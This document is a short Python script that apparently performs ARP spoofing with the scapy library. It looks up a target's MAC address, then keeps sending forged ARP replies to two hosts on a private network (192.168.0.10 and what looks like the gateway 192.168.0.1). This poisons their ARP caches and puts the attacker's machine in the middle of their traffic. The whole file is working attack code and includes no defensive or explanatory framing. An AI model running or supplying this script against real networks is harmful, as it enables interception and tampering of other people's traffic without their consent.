import scapy.all as scapy
import time
import sys

'''
Target_ip = ip of the target machine.
Spoof_ip = ip of the machine you want to use to trick the target.
'''

def get_mac_address(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    print(answered_list)

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip): 
    mac_address = get_mac_address(target_ip)   
    print(mac_address)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_ct = 0

try:
    while True:
        spoof("192.168.0.10", "192.168.0.1")
        spoof("192.168.0.1", "192.168.0.10")
        sent_packets_ct += 2
        print("\r[+] Packets sent : " + str(sent_packets_ct)),
        sys.stdout.flush()        
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detecting CTRL + C ..... Ending process.")


# 74-D0-2B-C5-18-D6